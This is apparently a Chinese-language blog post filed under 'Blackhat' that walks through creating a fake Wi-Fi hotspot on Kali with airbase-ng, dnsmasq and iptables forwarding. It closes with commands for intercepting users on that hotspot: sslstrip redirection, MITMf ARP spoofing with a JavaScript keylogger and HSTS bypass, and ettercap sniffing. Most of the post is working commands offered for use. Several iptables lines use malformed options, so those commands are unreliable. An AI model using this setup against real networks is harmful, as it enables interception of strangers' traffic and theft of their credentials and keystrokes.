---
title: Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点
name: aircrack-dnsmasq-fake-ap
date: 2017-1-8
tags: [aircrack，dnsmasq]
categories: [Blackhat]
---


* 目录
{:toc}

## 1.必须工具
- Aircrack-ng
- Dnsmasq
- Wireless Adapter

**Aircrack-ng**：Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。

**Dnsmasq**：DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。

**Wireless Adapter**：无线网卡，伪装AP热点无线一个无线网卡，建议使用外置的无线网卡。

## 2.查看无线网卡并启动监听
使用`airmon-ng`命令查看当前可用的无线网卡信息，如wlan0
使用`airmon-ng start [网卡名称]`启动无线网卡为监听模式，得到wlan0mon

## 3.创建无线AP热点
使用命令`airbase-ng -e [AP_NAME] -c [channel] wlan0mon`创建无线AP热点，如：
```shell
airbase-ng -e FreeWifi -c 6 wlan0mon
```
此时可以扫描到创建的无线热点，但是不能连接去。

## 4.创建虚拟网卡及网关
新打开一个终端，执行以下命令创建虚拟网卡及其路由配置
```shell
ifconfig at0 10.0.0.1/24 up
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
```

## 5.编辑Dnsmasq配置并启动
编辑 **dnsmasq** 配置文件`vi /etc/dnsmasq.conf`
```shell
interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-dhcp
log-queries
```
启动 **dnsmasq** 服务
```
dnsmasq -C /etc/dnsmasq.conf -d
```

## 6.开启IP转发并设置IPTables转发规则
```shell
iptables -flush
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -P FORWARD ACCEPT
iptables -append FORWARD -in-interface at0 ACCEPT

iptables -table -nat -append POSTROUTING -out-interface eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

## 后续可以做什么？
```
iptables -t nat -A PREROUTING -p tcp -destination 80 -j REDIRECT -to-port 10000
sslstrip -f -p -k 10000

mitmf -i at0 --spoof --arp -gateway 10.0.0.1 --jskeylogger --hsts

ettercap -p -u -T -q -i at0
```
